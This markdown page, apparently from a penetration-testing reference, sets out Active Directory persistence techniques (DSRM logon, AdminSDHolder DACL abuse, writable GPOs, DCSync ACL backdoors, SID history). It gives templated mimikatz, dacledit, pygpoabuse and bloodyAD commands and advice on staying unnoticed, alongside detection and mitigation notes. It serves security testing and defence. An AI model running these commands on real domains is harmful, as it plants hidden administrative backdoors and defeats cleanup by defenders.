---
title: Persistence techniques
category: AD / Persistence
order: 20
tags: [dsrm, adminsdholder, gpo, acl-backdoor, sid-history, persistence]
summary: >
  Ways to keep access after cleanup: DSRM logon, an AdminSDHolder ACL that keeps
  re-granting you rights, a writable GPO, a quiet ACL backdoor, or SID history.
  Most are cheap to plant and hard to spot.
prerequisites:
  - Domain Admin / equivalent (or the specific write needed for the ACL backdoor)
tools: [mimikatz, impacket, bloodyAD, SharpGPOAbuse / pyGPOAbuse, PowerView]
detection:
  - DSRM behaviour registry change; writes to AdminSDHolder DACL; new GPO tasks; SID history edits
mitigation:
  - Monitor AdminSDHolder + Tier-0 DACLs; audit GPO changes; alert on sIDHistory writes
refs:
  - { label: "The Hacker Recipes — persistence", url: "https://www.thehacker.recipes/ad/persistence" }
  - { label: "adsecurity — persistence", url: "https://adsecurity.org/?p=1929" }
---

## DSRM (Directory Services Restore Mode)

The DSRM local admin on a DC can be used over the network once its logon
behaviour is enabled — a stealthy DC backdoor.

```
lsadump::sam         # dump the DSRM hash (mimikatz, on the DC)
# then set DsrmAdminLogonBehavior = 2 to allow network logon with it
```

## AdminSDHolder (self-healing rights)

Write your account into the `AdminSDHolder` DACL; **SDProp** re-stamps it onto
every protected group (Domain Admins…) hourly — remove you from a group and the
ACL puts your rights back.

```sh
dacledit.py -action write -rights FullControl -principal $user \
  -target-dn "CN=AdminSDHolder,CN=System,$base_dn" -dc-ip $dc_ip $domain/$user:$password
```

## Writable GPO

A GPO you can edit that's linked to users/computers = code execution on all of
them (scheduled task / startup script).

```sh
pygpoabuse.py $domain/$user:$password -gpo-id <GPO_GUID> -command 'add user ...'
```

## ACL backdoor & SID history

```sh
# quiet: grant a low-key account DCSync on the domain (see WriteDacl)
bloodyAD -u $user -p $password -d $domain --host $dc_ip add dcsync <backdoor_user>
# SID history: add a privileged SID to an account you control (DA-level write)
```

> Least noisy of these is usually a **DCSync ACL** on an unremarkable account:
> no group membership to spot, just an extra ACE on the domain head.
